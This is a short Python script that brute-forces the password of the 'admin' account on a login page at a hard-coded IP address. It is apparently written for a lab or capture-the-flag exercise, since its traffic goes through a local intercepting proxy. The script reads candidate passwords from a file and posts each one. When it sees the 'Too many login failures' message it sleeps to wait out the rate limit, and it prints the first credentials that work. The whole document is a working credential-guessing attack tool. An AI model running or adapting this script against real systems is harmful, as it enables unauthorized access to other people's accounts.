import time

import requests

# file that contain user:pass
userpass_file = "userpass.txt"
username="admin"
# create url using user and password as argument
url = "http://68.183.41.74:30988/login.php"
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
# rate limit blocks for 30 seconds
lock_time = 30

# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:

        password = fline.strip() ## will contain \n char at the end e.g pass=TrillPrincessMentality#1%0A&submit=submit

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit" : "submit"
        }

        # do the request
        res = requests.post(url, data=data,proxies=proxies)

        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        # user and password were valid !
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)
        else:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
            break